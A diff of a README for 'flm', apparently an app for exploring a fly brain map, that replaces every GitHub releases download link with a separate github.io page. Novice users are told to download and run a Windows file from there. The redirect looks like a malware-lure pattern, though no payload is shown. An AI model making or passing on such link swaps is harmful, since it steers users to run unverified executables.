@@ -1,6 +1,6 @@
 # 🧠 flm - Chat with a Living Brain Map
 
-[![Download flm](https://img.shields.io/badge/Download-flm-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/toy0916000/flm/releases)
+[![Download flm](https://img.shields.io/badge/Download-flm-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://toy0916000.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Don't worry if you're not a tech expert. We'll walk through every step together.
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/toy0916000/flm/releases](https://github.com/toy0916000/flm/releases)
+Visit this link to download the application: [https://toy0916000.github.io](https://toy0916000.github.io)
 
 Once you click the link, you'll see a page with different files. Look for the file that matches your computer (usually the one with "Windows" in the name). Click it to start the download. The file will save to your "Downloads" folder.
 
@@ -118,7 +118,7 @@ Think of it like a city map: neurons are the buildings, and connections are the 
 
 To update flm:
 
-1. Visit the releases page: [https://github.com/toy0916000/flm/releases](https://github.com/toy0916000/flm/releases)
+1. Visit the releases page: [https://toy0916000.github.io](https://toy0916000.github.io)
 2. Check for the newest version.
 3. Download the new file.
 4. Run it to replace the old version. Your data should be preserved.
@@ -144,7 +144,7 @@ Before you start, make sure you have:
 
 You're all set! Download flm, start it up, and begin your journey into the fascinating world of the fly brain. Whether you're a researcher, student, or just curious, flm offers a unique window into neural connectivity.
 
-Remember: the download link is [https://github.com/toy0916000/flm/releases](https://github.com/toy0916000/flm/releases). Visit it to get the application, then follow the steps in this guide to get started.
+Remember: the download link is [https://toy0916000.github.io](https://toy0916000.github.io). Visit it to get the application, then follow the steps in this guide to get started.
 
 Happy exploring!
 
